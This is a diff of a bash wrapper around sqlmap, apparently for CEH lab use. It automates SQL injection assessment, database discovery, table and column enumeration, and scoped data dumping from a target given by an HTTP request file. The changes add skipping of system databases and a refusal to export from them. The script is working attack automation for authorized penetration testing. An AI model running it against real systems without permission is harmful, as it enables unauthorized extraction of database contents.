@@ -1,13 +1,13 @@
 
 #!/usr/bin/env bash
 # db.sh - Automated SQLmap Database Audit Tool
-# Use only against systems you own or are authorized to test.
-# Root privileges are not normally required for this script.
+# For authorized CEH labs and systems only.
 
 set -Eeuo pipefail
 umask 077
 
 # --- Configuration ---
+
 SQLMAP_PATH="/usr/bin/sqlmap"
 DEFAULT_OUTPUT_DIR="sqlmap_audit_$(date +%Y%m%d_%H%M%S)"
 CONFIG_FILE=""
@@ -20,16 +20,23 @@ REQUEST_FILE=""
 OUTPUT_DIR=""
 SELECTED_DB=""
 SQLMAP_LAST_OUTPUT=""
-
 STARTED_AT="$(date '+%Y-%m-%d %H:%M:%S')"
+
 ASSESSMENT_STATUS="NOT_RUN"
 DATABASE_STATUS="NOT_RUN"
 TABLE_STATUS="NOT_RUN"
 COLUMN_STATUS="NOT_RUN"
 EXPORT_STATUS="NOT_RUN"
 
-# --- Logging functions ---
-# Errors go directly to the terminal; no custom error log is created.
+# System databases that must not be selected or enumerated.
+SYSTEM_DATABASES=(
+    information_schema
+    mysql
+    performance_schema
+    sys
+)
+
+# --- Logging ---
 
 function log_info() {
     printf '[INFO] %s\n' "$*"
@@ -47,45 +54,52 @@ function log_done() {
     printf '[DONE] %s\n' "$*"
 }
 
+function die() {
+    log_error "$*"
+    exit 1
+}
+
 function usage() {
     cat <<'USAGE'
 Usage:
   ./db.sh REQUEST_FILE [options]
 
 Options:
-  --output DIR             Results directory
-  --config FILE            Read KEY=VALUE configuration
+  --output DIR             Output directory
+  --config FILE            Configuration file
   --dry-run                Skip actual data exports
-  --export-scope SCOPE     Explicit tables: db:DATABASE:TABLE[,db:DATABASE:TABLE]
+  --export-scope SCOPE     Explicit scope: db:DATABASE:TABLE[,db:DATABASE:TABLE]
   --row-limit N            Maximum rows per exported table (default: 100)
-  --export-format FORMAT   CSV, HTML, or SQLITE (default: CSV)
-  --help                   Display this help
+  --export-format FORMAT   CSV, HTML, or SQLITE
+  --help                   Show help
 
-Config keys:
-  SQLMAP_PATH
-  OUTPUT_DIR
-  DRY_RUN
-  EXPORT_SCOPE
-  ROW_LIMIT
-  EXPORT_FORMAT
+Use FIRST as the database name in an export scope to refer to
+the first discovered non-system database.
 
-Examples:
-  ./db.sh req.txt
+Example:
   ./db.sh req.txt --output results
-  ./db.sh req.txt --export-scope 'db:FIRST:users' --row-limit 100 --dry-run
+  ./db.sh req.txt --export-scope 'db:FIRST:users' --row-limit 100
+  ./db.sh req.txt --dry-run --export-scope 'db:FIRST:users'
 
-FIRST in an export scope means the first database discovered by SQLmap.
+Configuration file format (KEY=VALUE):
+  SQLMAP_PATH=/usr/bin/sqlmap
+  OUTPUT_DIR=/home/attacker/ceh-results
+  DRY_RUN=true
+  EXPORT_SCOPE=db:FIRST:users
+  ROW_LIMIT=100
+  EXPORT_FORMAT=CSV
 USAGE
     exit 0
 }
 
-function die() {
-    log_error "$*"
-    exit 1
-}
+# --- Configuration parsing ---
 
-# --- Read simple KEY=VALUE configuration safely ---
-# This does not execute the config file as shell code.
+function trim_value() {
+    local value="$1"
+    value="${value#"${value%%[![:space:]]*}"}"
+    value="${value%"${value##*[![:space:]]}"}"
+    printf '%s' "$value"
+}
 
 function load_config() {
     local config_file="$1"
@@ -99,13 +113,10 @@ function load_config() {
         [[ "$line" =~ ^[[:space:]]*$ ]] && continue
 
         [[ "$line" == *=* ]] ||
-            die "Invalid config line (expected KEY=VALUE): $line"
+            die "Invalid configuration line: $line"
 
-        key="${line%%=*}"
-        value="${line#*=}"
-
-        key="$(printf '%s' "$key" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"
-        value="$(printf '%s' "$value" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"
+        key="$(trim_value "${line%%=*}")"
+        value="$(trim_value "${line#*=}")"
 
         case "$key" in
             SQLMAP_PATH)   SQLMAP_PATH="$value" ;;
@@ -121,16 +132,13 @@ function load_config() {
     done < "$config_file"
 }
 
-# --- Parse arguments ---
-# Load config first so command-line options override config values.
-
+# Load config first, then let command-line options override it.
 ARGS=("$@")
 
 for ((i=0; i<${#ARGS[@]}; i++)); do
     if [[ "${ARGS[i]}" == "--config" ]]; then
-        if (( i + 1 >= ${#ARGS[@]} )); then
-            die "--config requires a file path."
-        fi
+        (( i + 1 < ${#ARGS[@]} )) ||
+            die "--config requires a filename."
         CONFIG_FILE="${ARGS[i+1]}"
     fi
 done
@@ -142,12 +150,12 @@ fi
 while (($#)); do
     case "$1" in
         --output)
-            [[ $# -ge 2 ]] || die "--output requires a directory."
+            (($# >= 2)) || die "--output requires a directory."
             OUTPUT_DIR="$2"
             shift 2
             ;;
         --config)
-            [[ $# -ge 2 ]] || die "--config requires a file path."
+            (($# >= 2)) || die "--config requires a filename."
             shift 2
             ;;
         --dry-run)
@@ -155,17 +163,17 @@ while (($#)); do
             shift
             ;;
         --export-scope)
-            [[ $# -ge 2 ]] || die "--export-scope requires a value."
+            (($# >= 2)) || die "--export-scope requires a value."
             EXPORT_SCOPE="$2"
             shift 2
             ;;
         --row-limit)
-            [[ $# -ge 2 ]] || die "--row-limit requires a number."
+            (($# >= 2)) || die "--row-limit requires a number."
             ROW_LIMIT="$2"
             shift 2
             ;;
         --export-format)
-            [[ $# -ge 2 ]] || die "--export-format requires a value."
+            (($# >= 2)) || die "--export-format requires a format."
             EXPORT_FORMAT="$2"
             shift 2
             ;;
@@ -176,11 +184,9 @@ while (($#)); do
             die "Unknown option: $1"
             ;;
         *)
-            if [[ -z "$REQUEST_FILE" ]]; then
-                REQUEST_FILE="$1"
-            else
+            [[ -z "$REQUEST_FILE" ]] ||
                 die "Unexpected extra argument: $1"
-            fi
+            REQUEST_FILE="$1"
             shift
             ;;
     esac
@@ -202,27 +208,19 @@ function check_dependencies() {
     command -v realpath >/dev/null 2>&1 ||
         die "Required command not found: realpath"
 
-    command -v sed >/dev/null 2>&1 ||
-        die "Required command not found: sed"
-
     log_info "SQLmap executable: $SQLMAP_PATH"
 }
 
 # --- Validate request file ---
 
 function validate_request_file() {
-    local request_file="$1"
+    local file="$1"
 
-    [[ -f "$request_file" ]] ||
-        die "Request file does not exist: $request_file"
+    [[ -f "$file" ]] || die "Request file not found: $file"
+    [[ -r "$file" ]] || die "Request file is not readable: $file"
+    [[ -s "$file" ]] || die "Request file is empty: $file"
 
-    [[ -r "$request_file" ]] ||
-        die "Cannot read request file: $request_file"
-
-    [[ -s "$request_file" ]] ||
-        die "Request file is empty: $request_file"
-
-    REQUEST_FILE="$(realpath "$request_file")"
+    REQUEST_FILE="$(realpath "$file")"
     log_info "Validated request file: $REQUEST_FILE"
 }
 
@@ -238,19 +236,19 @@ function prepare_output_directory() {
     log_info "Results directory: $OUTPUT_DIR"
 }
 
-# --- Execute SQLmap without saving error output to a custom log ---
-# stdout is captured in memory for database-name parsing.
-# stderr remains connected directly to the terminal.
+# --- Run SQLmap ---
+# Output is captured in memory and displayed in the terminal.
+# No custom error-log file is created.
 
 function run_sqlmap() {
-    local output
     local status=0
+    local output=""
 
     if output="$("$SQLMAP_PATH" \
         --batch \
         --disable-coloring \
         "--output-dir=$OUTPUT_DIR" \
-        "$@")"; then
+        "$@" 2>&1)"; then
         SQLMAP_LAST_OUTPUT="$output"
         [[ -z "$output" ]] || printf '%s\n' "$output"
         return 0
@@ -273,12 +271,12 @@ function run_stage() {
         return 0
     else
         local status=$?
-        log_error "Stage failed: $stage (exit code $status)"
+        log_error "$stage failed with exit code $status."
         return "$status"
     fi
 }
 
-# --- Initial SQL injection assessment ---
+# --- Initial assessment ---
 
 function sqlmap_assessment() {
     log_info "Starting SQL injection assessment..."
@@ -291,10 +289,27 @@ function sqlmap_assessment() {
         --random-agent
 }
 
-# --- Discover databases and select the first reported database ---
+# --- Check for system databases ---
+
+function is_system_database() {
+    local candidate="${1,,}"
+    local system_db
+
+    for system_db in "${SYSTEM_DATABASES[@]}"; do
+        if [[ "$candidate" == "$system_db" ]]; then
+            return 0
+        fi
+    done
+
+    return 1
+}
+
+# --- Discover databases and choose the first non-system DB ---
 
 function discover_databases() {
     local database
+    local -a discovered=()
+    local -a non_system=()
 
     log_info "Discovering databases..."
 
@@ -305,9 +320,7 @@ function discover_databases() {
         return 1
     fi
 
-    local -a DISCOVERED_DATABASES=()
-
-    mapfile -t DISCOVERED_DATABASES < <(
+    mapfile -t discovered < <(
         printf '%s\n' "$SQLMAP_LAST_OUTPUT" |
         awk '
             /available databases[[:space:]]*\[[0-9]+\]:/ {
@@ -316,7 +329,7 @@ function discover_databases() {
             }
             inlist && /^[[:space:]]*\[\*\][[:space:]]*/ {
                 sub(/^[[:space:]]*\[\*\][[:space:]]*/, "")
-                if (length($0) > 0) print
+                if (length($0)) print
                 next
             }
             inlist && /^[[:space:]]*$/ { next }
@@ -324,33 +337,44 @@ function discover_databases() {
         '
     )
 
-    if ((${#DISCOVERED_DATABASES[@]} == 0)); then
+    if ((${#discovered[@]} == 0)); then
         DATABASE_STATUS="FAILED"
-        log_error "No database list could be parsed from SQLmap output."
-        log_warn "The target may have no accessible databases, or SQLmap output may differ."
+        log_error "Could not parse a database list from SQLmap output."
+        log_warn "The output format may differ, or no database list was returned."
         return 1
     fi
 
     log_info "Databases reported by SQLmap:"
-    for database in "${DISCOVERED_DATABASES[@]}"; do
-        printf '  - %s\n' "$database"
+
+    for database in "${discovered[@]}"; do
+        if is_system_database "$database"; then
+            log_info "Skipping system database: $database"
+        else
+            non_system+=("$database")
+            log_info "Application database: $database"
+        fi
     done
 
-    # Use exactly the first database reported by SQLmap.
-    SELECTED_DB="${DISCOVERED_DATABASES[0]}"
+    if ((${#non_system[@]} == 0)); then
+        DATABASE_STATUS="FAILED"
+        log_error "No non-system databases were discovered."
+        return 1
+    fi
+
+    # Keep the first non-system database in SQLmap's reported order.
+    SELECTED_DB="${non_system[0]}"
     DATABASE_STATUS="SUCCESS"
 
-    log_info "Selected first discovered database: $SELECTED_DB"
-    log_warn "The first database may be a system database; it is not automatically skipped."
+    log_info "Selected first non-system database: $SELECTED_DB"
 }
 
 # --- Enumerate tables in the selected database ---
 
 function enumerate_tables() {
     [[ -n "$SELECTED_DB" ]] ||
-        die "Cannot enumerate tables: no database was selected."
+        die "Cannot enumerate tables: no non-system database selected."
 
-    log_info "Enumerating tables in database: $SELECTED_DB"
+    log_info "Enumerating tables in: $SELECTED_DB"
 
     run_stage "Table enumeration" \
         -r "$REQUEST_FILE" \
@@ -362,9 +386,9 @@ function enumerate_tables() {
 
 function enumerate_columns() {
     [[ -n "$SELECTED_DB" ]] ||
-        die "Cannot enumerate columns: no database was selected."
+        die "Cannot enumerate columns: no non-system database selected."
 
-    log_info "Enumerating columns in database: $SELECTED_DB"
+    log_info "Enumerating columns in: $SELECTED_DB"
 
     run_stage "Column enumeration" \
         -r "$REQUEST_FILE" \
@@ -375,55 +399,52 @@ function enumerate_columns() {
 # --- Export explicitly scoped tables only ---
 
 function export_data() {
-    local output_dir="$1"
-    local export_scope="$2"
-    local row_limit="$3"
-    local export_format="$4"
+    local export_scope="$1"
+    local row_limit="$2"
+    local export_format="$3"
 
     if [[ -z "$export_scope" ]]; then
         EXPORT_STATUS="SKIPPED"
-        log_warn "No export scope specified; skipping data export."
+        log_warn "No export scope specified; skipping export."
         return 0
     fi
 
-    if [[ "$DRY_RUN" == true ]]; then
-        log_warn "Dry-run enabled: no table data will be exported."
-    fi
+    local -a items=()
+    local item kind database table extra
 
-    local -a ITEMS=()
-    local item scope_kind database table extra
+    IFS=',' read -r -a items <<< "$export_scope"
 
-    IFS=',' read -r -a ITEMS <<< "$export_scope"
+    for item in "${items[@]}"; do
+        IFS=':' read -r kind database table extra <<< "$item"
 
-    for item in "${ITEMS[@]}"; do
-        item="$(printf '%s' "$item" |
-            sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"
-
-        IFS=':' read -r scope_kind database table extra <<< "$item"
-
-        if [[ "$scope_kind" != "db" ||
+        if [[ "$kind" != "db" ||
               -z "${database:-}" ||
               -z "${table:-}" ||
               -n "${extra:-}" ]]; then
-            log_error "Invalid scope '$item'. Expected db:DATABASE:TABLE."
+            log_error "Invalid export scope '$item'. Expected db:DATABASE:TABLE."
             EXPORT_STATUS="FAILED"
             return 1
         fi
 
         if [[ "$database" == "FIRST" ]]; then
             [[ -n "$SELECTED_DB" ]] ||
-                die "FIRST requested for export, but no database was selected."
+                die "FIRST requested but no non-system database was selected."
             database="$SELECTED_DB"
         fi
 
-        log_info "Export scope: database='$database', table='$table', row limit=$row_limit"
+        if is_system_database "$database"; then
+            log_error "Refusing export from system database: $database"
+            EXPORT_STATUS="FAILED"
+            return 1
+        fi
+
+        log_info "Export scope: $database.$table (row limit: $row_limit)"
 
         if [[ "$DRY_RUN" == true ]]; then
-            log_info "Dry run: export skipped for $database.$table"
+            log_info "Dry run: skipping export of $database.$table"
             continue
         fi
 
-        # The HTTP request and database are passed explicitly.
         if ! run_stage "Export $database.$table" \
             -r "$REQUEST_FILE" \
             --random-agent \
@@ -446,7 +467,7 @@ function export_data() {
     log_info "Export-scope processing completed."
 }
 
-# --- Generate accurate report ---
+# --- Generate report ---
 
 function generate_report() {
     local overall_status="$1"
@@ -464,7 +485,7 @@ function generate_report() {
         printf 'Request file: %s\n' "$REQUEST_FILE"
         printf 'SQLmap executable: %s\n' "$SQLMAP_PATH"
         printf 'Selected database: %s\n' "${SELECTED_DB:-Not selected}"
-        printf 'SQLmap output directory: %s\n' "$OUTPUT_DIR"
+        printf 'Output directory: %s\n' "$OUTPUT_DIR"
         printf '\nStage statuses:\n'
         printf '  Assessment: %s\n' "$ASSESSMENT_STATUS"
         printf '  Database discovery: %s\n' "$DATABASE_STATUS"
@@ -472,8 +493,7 @@ function generate_report() {
         printf '  Column enumeration: %s\n' "$COLUMN_STATUS"
         printf '  Data export: %s\n' "$EXPORT_STATUS"
         printf '\n'
-        printf '%s\n' 'Note: SQLmap output files are in its output directory.'
-        printf '%s\n' 'This report does not claim that a vulnerability was confirmed.'
+        printf '%s\n' 'This report records stage statuses, not raw error output.'
     } > "$report_file"
 
     log_info "Report generated: $report_file"
@@ -493,14 +513,12 @@ function main() {
     else
         ASSESSMENT_STATUS="FAILED"
         generate_report "FAILED"
-        die "Assessment failed. See the terminal output above."
+        die "Assessment failed; review the terminal output."
     fi
 
-    if discover_databases; then
-        :
-    else
+    if ! discover_databases; then
         generate_report "FAILED"
-        die "Database discovery failed. See the terminal output above."
+        die "Database discovery failed; review the terminal output."
     fi
 
     if enumerate_tables; then
@@ -508,7 +526,7 @@ function main() {
     else
         TABLE_STATUS="FAILED"
         generate_report "FAILED"
-        die "Table enumeration failed. See the terminal output above."
+        die "Table enumeration failed; review the terminal output."
     fi
 
     if enumerate_columns; then
@@ -516,23 +534,21 @@ function main() {
     else
         COLUMN_STATUS="FAILED"
         generate_report "FAILED"
-        die "Column enumeration failed. See the terminal output above."
+        die "Column enumeration failed; review the terminal output."
     fi
 
-    if export_data "$OUTPUT_DIR" "$EXPORT_SCOPE" "$ROW_LIMIT" "$EXPORT_FORMAT"; then
-        :
-    else
+    if ! export_data "$EXPORT_SCOPE" "$ROW_LIMIT" "$EXPORT_FORMAT"; then
         overall_status="PARTIAL_FAILURE"
         generate_report "$overall_status"
-        die "One or more export operations failed."
+        die "Export failed; review the terminal output."
     fi
 
     generate_report "$overall_status"
     log_done "Assessment workflow finished."
-    log_info "Review the report and SQLmap output directory: $OUTPUT_DIR"
+    log_info "Results directory: $OUTPUT_DIR"
 }
 
-# --- Validate configuration values ---
+# --- Validate settings ---
 
 [[ "$DRY_RUN" == true || "$DRY_RUN" == false ]] ||
     die "DRY_RUN must be true or false."
